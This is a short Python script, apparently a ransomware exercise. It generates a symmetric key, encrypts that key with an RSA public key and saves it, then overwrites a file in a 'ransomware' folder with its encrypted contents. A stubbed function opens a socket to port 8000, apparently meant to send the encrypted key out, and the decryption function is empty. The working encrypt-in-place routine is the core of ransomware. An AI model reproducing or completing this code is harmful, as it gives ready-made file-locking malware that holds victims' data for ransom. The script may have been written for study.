from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import socket

"""
This file is used to encrypt a file using a symmetric key. The symmetric key is encrypted using the public key of the recipient.
The encrypted key is then saved to a file. That key is then used to encrypt a file.
"""

symmetricKey = Fernet.generate_key()

FernetInstance = Fernet(symmetricKey)

with open("./keys/public_key.key", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
    key_file.read(),
    backend=default_backend()
    )

encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
        )
    )


with open("./keys/encryptedSymmertricKey.key", "wb") as key_file:
    key_file.write(encryptedSymmetricKey)

    filePath = "./ransomware/SecretTextFile.txt"

    with open(filePath, "rb") as file:
        file_data = file.read()
        encrypted_data = FernetInstance.encrypt(file_data)

    with open(filePath, "wb") as file:
        file.write(encrypted_data)


def sendEncryptedKey(eKeyFilePath):
    with socket.create_connection(("", 8000)) as sock:
        with open(eKeyFilePath, "rb") as file:
            pass

def decryptFile(filePath, key):
    pass

quit()